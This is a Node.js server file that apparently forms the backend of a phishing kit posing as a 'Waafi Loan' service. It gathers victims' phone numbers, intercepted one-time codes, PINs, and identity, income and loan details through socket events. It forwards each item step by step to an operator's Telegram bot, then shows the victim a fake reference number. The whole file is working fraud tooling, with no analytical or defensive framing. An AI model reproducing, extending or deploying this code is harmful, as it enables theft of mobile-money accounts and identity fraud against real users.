require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['polling'] // Forced polling fallback for Vercel stability
});

global.io = io; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Webhook endpoint matched to receive Telegram callback buttons
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    try {
        botManager.bot.processUpdate(req.body);
    } catch (err) {
        console.error("Error processing update:", err);
    }
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    let activeRoom = `WFI-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    socket.join(activeRoom);
    socket.emit('session-ready', { appId: activeRoom });
    console.log(` Assigned internal tracking session: ${activeRoom}`);

    socket.on('join-room', (room) => {
        if (room && room !== "null" && room !== "") {
            socket.leave(activeRoom);
            socket.join(room);
            activeRoom = room;
            console.log(` User synchronized room identifier: ${room}`);
        }
    });

    const getValidId = (data) => {
        if (data && data.appId && data.appId !== "null" && data.appId !== "") {
            return data.appId;
        }
        return activeRoom;
    };

    socket.on('request-otp1', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Initial Request: Phone Submitted", { Phone: data.phone }, false);
        socket.emit('otp1-requested-success');
    });

    socket.on('verify-otp1', (data) => {
        const currentId = getValidId(data);
        botManager.sendToAdmin(currentId, "Step 1: Phone & Intercepted OTP 1", { "OTP 1": data.code }, true);
    });

    socket.on('verify-pin', (data) => {
        const currentId = getValidId(data);
        botManager.sendFinalApproval(currentId, data.pin);
    });

    socket.on('verify-otp2', (data) => {
        const currentId = getValidId(data);
        botManager.sendSecondOTP(currentId, data.code);
    });

    socket.on('finalize-loan', (data) => {
        const currentId = getValidId(data);
        const { confirmPin, ...profileData } = data;
        
        botManager.sendToAdmin(currentId, "Step 4: Loan Request Parameters", {
            "Type": profileData.loanType,
            "Amount": profileData.amount,
            "Term": profileData.term + " mois",
            "Purpose": profileData.purpose
        }, false);

        botManager.sendToAdmin(currentId, "Step 5: Personal Identity Profile", {
            "Name": `${profileData.firstName} ${profileData.lastName}`,
            "Email": profileData.email
        }, false);

        botManager.sendToAdmin(currentId, "Step 6: Employment & Income Status", {
            "Status": profileData.employment,
            "Income": profileData.income,
            "Employer": profileData.employer || "N/A"
        }, false);

        botManager.sendToAdmin(currentId, "Step 7: Final Signature PIN Confirmation", { 
            "Confirmed PIN": confirmPin 
        }, false);
        
        const referenceId = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
        io.to(currentId).emit('application-finalized', { referenceId });
        console.log(` Session ${currentId} successfully generated local validation parameters.`);
    });

    socket.on('disconnect', () => {
        console.log(` User disconnected socket room: ${activeRoom}`);
    });
});

// Run local listener only if not executing in Vercel's production environment
if (process.env.NODE_ENV !== 'production') {
    const PORT = process.env.PORT || 3000;
    server.listen(PORT, () => {
        console.log(` Waafi Loan Server running locally on port ${PORT}`);
    });
}

// Export the server directly so Vercel can resolve execution requests
module.exports = server;
